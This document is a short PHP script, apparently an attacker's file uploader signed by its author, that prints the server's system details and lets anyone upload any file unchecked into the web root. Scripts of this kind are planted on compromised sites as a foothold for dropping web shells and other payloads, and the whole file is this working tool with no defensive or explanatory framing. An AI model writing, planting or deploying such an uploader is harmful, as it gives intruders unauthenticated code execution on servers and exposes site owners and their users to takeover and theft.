<?php
echo "Uploader by Prabesh Sapkota<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='lmao'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['lmao']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['lmao']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Uploaded Sucessfully! Go to this link -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Can't Upload the file !";
		}
	} else {
		if(@copy($_FILES['lmao']['tmp_name'], $files)) {
			echo "You file : <b>$files</b> was uploaded to the same folder";
		} else {
			echo "Its Dead !";
		}
	}
}
?>

